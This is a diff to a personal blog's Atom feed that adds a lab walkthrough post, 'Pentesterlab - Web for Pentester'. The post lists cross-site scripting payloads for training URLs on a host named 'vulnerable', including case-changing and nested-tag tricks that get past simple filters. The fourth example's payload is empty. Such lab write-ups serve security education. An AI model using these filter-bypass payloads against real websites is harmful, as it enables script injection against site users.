@@ -4,7 +4,7 @@
   <title><![CDATA[My Octopress Blog]]></title>
   <link href="http://lambord9.github.io/atom.xml" rel="self"/>
   <link href="http://lambord9.github.io/"/>
-  <updated>2020-10-07T00:19:50+07:00</updated>
+  <updated>2020-10-07T15:53:05+07:00</updated>
   <id>http://lambord9.github.io/</id>
   <author>
     <name><![CDATA[Your Name]]></name>
@@ -12,5 +12,44 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab - Web for Pentester]]></title>
+    <link href="http://lambord9.github.io/blog/2020/10/07/pentesterlab-web-for-pentester/"/>
+    <updated>2020-10-07T15:02:38+07:00</updated>
+    <id>http://lambord9.github.io/blog/2020/10/07/pentesterlab-web-for-pentester</id>
+    <content type="html"><![CDATA[<h3>Example 1</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vulnerable//xss/example1.php?name=hacker
+</span><span class='line'>http://vulnerable//xss/example1.php?name=&lt;script>alert(1)&lt;/script></span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Example 2</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vulnerable//xss/example2.php?name=hacker
+</span><span class='line'>http://vulnerable//xss/example2.php?name=&lt;Script>alert(1)&lt;/Script></span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Example 3</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vulnerable//xss/example3.php?name=hacker
+</span><span class='line'>http://vulnerable//xss/example3.php?name=&lt;scr&lt;script>ipt>alert(1)&lt;/sc&lt;/script>ript></span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Example 4</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vulnerable//xss/example4.php?name=hacker
+</span><span class='line'>http://vulnerable//xss/example4.php?name=</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
 </feed>
